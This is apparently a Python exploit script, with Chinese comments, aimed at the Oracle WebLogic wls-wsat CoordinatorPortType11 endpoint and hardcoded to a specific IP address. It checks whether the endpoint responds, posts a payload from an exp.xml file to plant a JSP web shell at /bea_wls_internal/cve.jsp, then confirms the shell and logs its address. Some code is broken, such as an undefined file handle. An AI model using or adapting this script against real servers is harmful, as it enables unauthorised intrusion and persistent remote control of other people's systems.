import requests
from exp10it import get_request
from exp10it import post_request
import urllib.request, urllib.error, urllib.parse
import sys
import re


#判断weblogic漏洞是否存在的地址，因没有poc，暂时只能判断这个地址
check_addr = '/wls-wsat/CoordinatorPortType11'
shell_addr = '/bea_wls_internal/cve.jsp'


#请求头
heads = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8',
'SOAPAction': '',
'Content-Type': 'text/xml;charset=UTF-8',}

url="https://124.250.88.203"
#判断漏洞是否存在
url = re.sub(r'\s$','',url)
vuln_url = url+check_addr
content = get_request(vuln_url)
f=open("exp.xml","r")
if content['code'] ==200:
    print(vuln_url+'  ---is exist  ')
    #漏洞存在则发post包，判断shell是否成功写入，写入则保存在shell.txt中
    #files = {'file':open('exp.xml','rb')}

    #print(vuln_url)
    #a=requests.post(vuln_url,headers=heads,files=files)
    a=post_request(vuln_url,data=f,verify=False)
    print(a)
    input(666666)
    page = requests.get(url+shell_addr)
    print(page.content,page.status_code)

    if requests.get(url+shell_addr).status_code ==200:
        print("getshell success,shell is:%s"%(url+shell_addr))
        s.write(url+shell_addr)
